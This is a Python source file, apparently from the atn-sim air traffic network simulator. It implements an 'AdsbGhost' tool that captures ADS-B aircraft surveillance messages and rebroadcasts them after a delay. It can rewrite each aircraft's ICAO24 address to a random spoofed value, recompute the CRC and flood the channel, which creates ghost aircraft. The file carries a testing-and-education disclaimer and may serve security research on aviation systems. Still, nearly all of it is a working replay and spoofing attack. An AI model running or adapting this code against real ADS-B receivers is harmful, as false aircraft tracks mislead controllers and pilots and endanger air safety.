#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Copyright 2016, ICEA
#
# This file is part of atn-sim
#
# atn-sim is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# atn-sim is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


import binascii
import os
import sys
import socket
import threading
import time

import atn.surveillance.adsb.decoder as adsb_decoder
import atn.surveillance.adsb.adsb_utils as adsb_utils

from ..adsb_in import AdsbIn
from ..adsb_out import AdsbOut

__author__ = "Marcio Monteiro"
__version__ = "0.1"
__date__ = "2016-dec-08"


class AdsbGhost:

    delay = 30

    icao24_rewrite = False
    flood = False

    icao24_table = {}
    icao24 = []
    icao24_spoofed = []

    def __init__(self):
        self.name = socket.gethostname()
        self.adsbin = AdsbIn(store_msgs=True)
        self.adsbout = AdsbOut(nodename=self.name)

    def start(self):
        self.adsbin.start()
        self.listen()

    def listen(self):
        while True:
            message = self.adsbin.retrieve_msg()

            if message is None:
                time.sleep(0.2)
            else:

                if self.icao24_rewrite:
                    icao24 = adsb_decoder.get_icao_addr(message)

                    # Do not spoof our own spoofed messages
                    if icao24 in self.icao24_spoofed and not self.flood:
                        continue

                    if icao24 not in self.icao24:
                        new_icao24 = binascii.b2a_hex(os.urandom(3))
                        self.icao24.append(icao24)
                        self.icao24_spoofed.append(new_icao24)
                        self.icao24_table[icao24] = new_icao24

                    message = self.rewrite_icao24(message)

                t1 = threading.Thread(target=adsb_replay, args=(message, self.delay, self.adsbout))
                t1.start()

    def rewrite_icao24(self, message):
        msg_icao24 = adsb_decoder.get_icao_addr(message)
        new_icao24 = self.icao24_table[msg_icao24]

        # Replace old ICAO address
        new_message_hex = message[0:2] + new_icao24 + message[8:22]
        new_message_bin = bin(int(new_message_hex, 16))[2:].zfill(24)

        # Re-calculate the CRC
        crc = adsb_utils.calc_crc(new_message_bin)
        crc_hex = hex(int(crc, 2)).rstrip("L").lstrip("0x")

        return new_message_hex+crc_hex


def adsb_replay(message, delay, dev):
    time.sleep(delay)
    dev.broadcast(message)
    print message


def disclaimer():
    print " DISCLAIMER: This software is for testing and educational"
    print " purposes only. Any other usage for this code is not allowed."
    print " Use at your own risk."
    print
    print " 'With great power comes great responsibility.' - Uncle Ben"


def main():

    tx = AdsbGhost()

    if "--rewrite-icao24" in sys.argv:
        print " > Rewritting ICAO24"
        tx.icao24_rewrite = True

    if "--flood" in sys.argv:
        print " > Flooding with delayed messages"
        tx.flood = True

    disclaimer()
    tx.start()

if __name__ == '__main__':
    main()
